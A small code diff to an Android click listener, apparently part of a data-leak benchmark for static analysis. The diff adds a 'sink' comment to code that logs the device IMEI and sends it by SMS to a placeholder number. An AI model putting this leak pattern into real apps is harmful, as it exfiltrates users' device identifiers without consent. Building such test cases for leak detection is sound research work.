@@ -15,7 +15,7 @@ public class Button2Listener implements OnClickListener {
 
 	@Override
 	public void onClick(View arg0) {
-		Log.i("TAG", "Button2 - IMEI: " + act.imei);
+		Log.i("TAG", "Button2 - IMEI: " + act.imei); // sink
     	SmsManager sms = SmsManager.getDefault();
         sms.sendTextMessage("+49", null, act.imei, null, null);  //sink, leak
 	}
